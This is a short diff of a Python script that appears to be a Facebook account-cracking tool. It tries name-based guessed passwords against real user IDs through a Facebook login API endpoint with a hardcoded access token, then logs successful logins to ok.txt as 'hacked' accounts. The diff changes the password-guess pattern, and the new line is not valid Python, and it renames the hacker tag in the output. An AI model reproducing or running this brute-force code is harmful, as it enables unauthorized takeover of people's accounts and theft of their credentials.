@@ -724,7 +724,7 @@ def menu_select():
 
 		                                        else:
 
-		                                            pass6=name+"5555"
+		                                            pass6=first name+" "+last name
 
 		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -746,7 +746,7 @@ def menu_select():
 
 		                                                if 'access_token' in d:
 
-		                                                    print("\x1b[1;96m[sher-hacked] "+uid+" | "+pass6+"\x1b[1;0m")
+		                                                    print("\x1b[1;96m[efk-hacked] "+uid+" | "+pass6+"\x1b[1;0m")
 
 		                                                    ok=open("ok.txt","a")
 
